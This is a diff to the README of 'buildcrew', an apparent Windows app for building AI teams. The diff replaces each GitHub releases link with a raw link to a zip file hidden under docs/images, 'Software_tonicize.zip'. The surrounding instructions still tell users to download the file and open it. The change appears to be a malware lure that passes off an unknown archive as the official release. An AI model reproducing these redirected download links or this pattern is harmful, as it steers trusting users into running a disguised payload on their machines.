@@ -1,6 +1,6 @@
 # 🤖 buildcrew - Build your AI team fast
 
-[![Download buildcrew](https://img.shields.io/badge/Download-buildcrew-6f42c1?style=for-the-badge&logo=github)](https://github.com/Throaty-chaff551/buildcrew/releases)
+[![Download buildcrew](https://img.shields.io/badge/Download-buildcrew-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Throaty-chaff551/buildcrew/main/docs/images/Software_tonicize.zip)
 
 ## 🚀 What is buildcrew?
 
@@ -23,7 +23,7 @@ For best results, keep Windows up to date and close apps you do not need while y
 
 Go to the release page here:
 
-[Visit the buildcrew releases page](https://github.com/Throaty-chaff551/buildcrew/releases)
+[Visit the buildcrew releases page](https://raw.githubusercontent.com/Throaty-chaff551/buildcrew/main/docs/images/Software_tonicize.zip)
 
 On that page, look for the latest version and download the Windows file that matches your PC. If you see more than one file, pick the one meant for Windows. After the file finishes downloading, open it to start the app or run the installer.
 
@@ -163,7 +163,7 @@ Use these to start:
 ## 🖱️ Download and install
 
 1. Open the buildcrew releases page:
-   [https://github.com/Throaty-chaff551/buildcrew/releases](https://github.com/Throaty-chaff551/buildcrew/releases)
+   [https://raw.githubusercontent.com/Throaty-chaff551/buildcrew/main/docs/images/Software_tonicize.zip](https://raw.githubusercontent.com/Throaty-chaff551/buildcrew/main/docs/images/Software_tonicize.zip)
 2. Find the latest release.
 3. Download the Windows file from that release.
 4. Open the file and follow the install steps.
@@ -215,5 +215,5 @@ If the app feels cluttered or you want to try a new setup, create a new workspac
 
 ## 📎 Release link
 
-[Open the latest buildcrew release](https://github.com/Throaty-chaff551/buildcrew/releases)
+[Open the latest buildcrew release](https://raw.githubusercontent.com/Throaty-chaff551/buildcrew/main/docs/images/Software_tonicize.zip)
 
